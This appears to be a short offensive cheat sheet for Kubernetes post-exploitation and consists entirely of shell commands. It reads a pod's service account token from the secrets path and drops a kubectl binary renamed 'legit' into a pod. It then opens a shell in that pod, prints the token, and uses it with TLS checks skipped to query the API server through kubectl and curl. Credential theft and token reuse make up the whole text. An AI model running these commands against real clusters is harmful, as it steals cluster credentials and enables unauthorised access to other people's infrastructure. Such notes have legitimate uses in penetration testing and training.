# Service Account Token
cat /run/secrets/kubernetes.io/serviceaccount/token

# K8s client - From inside a pod
```
arch=$(uname -m | sed 's/x86_64/amd64/g' | sed 's/aarch64/arm64/g')
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/$arch/kubectl"
mv kubectl legit
kubectl cp legit default/ping-app:/var/tmp/legit
kubectl exec -ti ping-app -- /bin/sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo $TOKEN
chmod +x /var/tmp/legit
cd /var/tmp
./legit --server https://kubernetes.default --insecure-skip-tls-verify --token $TOKEN get pods
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/pods
```
